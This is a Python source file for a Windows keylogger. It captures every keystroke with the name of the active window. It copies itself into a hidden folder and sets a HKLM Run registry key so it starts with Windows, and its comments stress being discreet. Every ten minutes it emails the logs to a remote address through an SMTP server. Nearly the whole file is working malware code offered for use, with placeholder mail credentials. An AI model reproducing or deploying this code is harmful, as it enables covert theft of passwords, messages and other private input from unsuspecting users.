import pythoncom, pyHook, threading, os, time, shutil, sys
#This allow us to capture de windows name where the key is pressed
from win32gui import GetWindowText, GetForegroundWindow

'''Global variables'''
lastWindow = GetWindowText(GetForegroundWindow())
auxWindow = None
#list that save the keystrokes
mainList = []
#this list will be a copy of mainList when we set the signal to write in to the log file 
auxList = []

#directory where we want to store the program
dirProgram = 'c:' + '\Folder'
#full path of the log file, be careful of choose a good place
dirLog = dirProgram + '\log.txt'
#full path of the copy log file that will be send by mail ,in this case I will send a log file with the name of the user 
dirCopy = dirProgram + '\log%s.txt' %os.getlogin()
#full path of the program we want, necesary for set the registry key 
pathProgram = dirProgram + '\\' + os.path.basename(sys.argv[0])
#name of the app that we want to store in the registry key, be discreet

#email 
user = 'yourmail'
pwd = 'yourpassword'
recipient = 'destination mail'
#seconds that email with log file will be send
delay = 600

#This is the core function, receives the keystroke event and we can do whatever we want with it
#return true to pass the event to others handlers
def OnKeyboardEvent(event):

	global lastWindow
	global auxWindow
	global auxList
	
	#we will keep this for a while...
	#print ('Ascii:', event.Ascii, chr(event.Ascii))
	#print ('KeyID:', event.KeyID)
	
	#we will write to log file when the user type something in a different window
	window = GetWindowText(GetForegroundWindow())
	if window != lastWindow:
		auxWindow = lastWindow
		lastWindow = window
		#now we have to check if the user typed something valid
		if len(mainList) > 0:
			auxList = list(mainList)
			mainList.clear()
			#the signal is on! time to write in to the log file!
			print('se envia la senal!')
			e.set()
			
	#put the filtered keystroke in the mainlist
	key = filter(event.Ascii)
	if key !=0:
		mainList.append(key)
	#print (mainList)
	
	return True

#Another important function that consist in the main loop that wait's forever
def mainFunction():	
	# create a hook manager
	hm = pyHook.HookManager()
	# watch for all keyboard events
	hm.KeyDown = OnKeyboardEvent
	# set the hook
	hm.HookKeyboard()
	#wait forever
	pythoncom.PumpMessages()
	
#This function wait forever for the signal that tell the program to write in to the log file 
def waiter():
	while True:
		e.wait()
		writer()
		e.clear()

#Function that write in the log file 
def writer():
	global auxList
	f = open(dirLog, 'a')
	f.write('***' + auxWindow + '***')
	f.write('\n')
	aux = ''
	for char in auxList:
		aux = aux + char
	auxList.clear()
	f.write(aux)
	f.write('\n')
	f.close()

#Function that filter and maps the keystrokes by it ascii code
def filter(ascii):
	if ascii == 13:
		return '\n'
		
	if ascii == 19 or ascii == 26 or ascii == 3 or ascii == 22 or ascii == 24 or ascii == 9 or ascii == 10 or ascii == 11 or ascii == 12 or ascii == 13 or ascii == 14 or ascii == 15 or ascii == 16 or ascii == 17:
		return 0

	if ascii == 0 or ascii == 9:
		return 0
	
	if ascii == 27:
		return '(tecla escape)'
		
	if ascii == 8:
		return '(tecla borrar)'
	
	return chr(ascii)

#Function that send an email with the log file
def sendMail():
	import smtplib
	from email import encoders
	from email.mime.base import MIMEBase
	from email.mime.multipart import MIMEMultipart
    
	while 1:
		if os.path.isfile(dirLog):
			#check if the logfile have something
			b = os.path.getsize(dirLog)
			if b > 0 :	
				shutil.copy(dirLog, dirCopy)
				# Create the enclosing (outer) message
				outer = MIMEMultipart()
				outer['Subject'] = os.getlogin()
				outer['To'] = recipient
				outer['From'] = user
				outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'
				try:
					with open(dirCopy, 'rb') as fp:
						msg = MIMEBase('application', "octet-stream")
						msg.set_payload(fp.read())
					encoders.encode_base64(msg)
					msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(dirCopy))
					outer.attach(msg)
				except:
					print("Unable to open one of the attachments. Error: ", sys.exc_info()[0])
					pass

				composed = outer.as_string()
					
				try:
					with smtplib.SMTP('smtp.mail.ru', 587) as s:
						s.ehlo()
						s.starttls()
						s.ehlo()
						s.login(user, pwd)
						s.sendmail(user, recipient, composed)
						s.close()		
					print("Email sent!")
					os.remove(dirLog)
					f = open(dirLog, 'a')
					f.close()
					
				except:
					print("Unable to send the email. Error: ", sys.exc_info()[0])
					pass
				os.remove(dirCopy)
		else:
			print("No existe el archivo")
		time.sleep(delay)

#set a registry value to start our program with windows 
def launchAtStart():
	#first of all we have to check if the path that we want exists
	if not os.path.exists(dirProgram):
		os.makedirs(dirProgram)
		#copy the program to the new folder
		shutil.copy(sys.argv[0], dirProgram)
		#create the registry key 
		from win32api import (GetModuleFileName, RegCloseKey, RegDeleteValue,
						  RegOpenKeyEx, RegSetValueEx)

		from win32con import HKEY_LOCAL_MACHINE, KEY_WRITE, REG_SZ
		SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
		
		key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
		flag = RegSetValueEx(key, appName, 0, REG_SZ, pathProgram)
		RegCloseKey(key)
		
		return 1
	
	return 0 

'''We will use threads for various things'''
#This is the thread that handle the main function
class mainThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		mainFunction()
		
#This is the thread that waits for the signal to write in the log file
class waiterThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		waiter()
		
#This thread handle the email stuff
class mailThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		sendMail()
		
#Thread for set the program with windows start 
class startUpThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		launchAtStart()

e = threading.Event()	

main = mainThread(1, "mainThread", 1)
wait = waiterThread(2, "waiterThread", 2)
mail = mailThread(3, "mailThread", 3)
startUp = startUpThread(4, "startUpThread", 4)

startUp.start()
time.sleep(3)
wait.start()
main.start()
time.sleep(3)
mail.start()


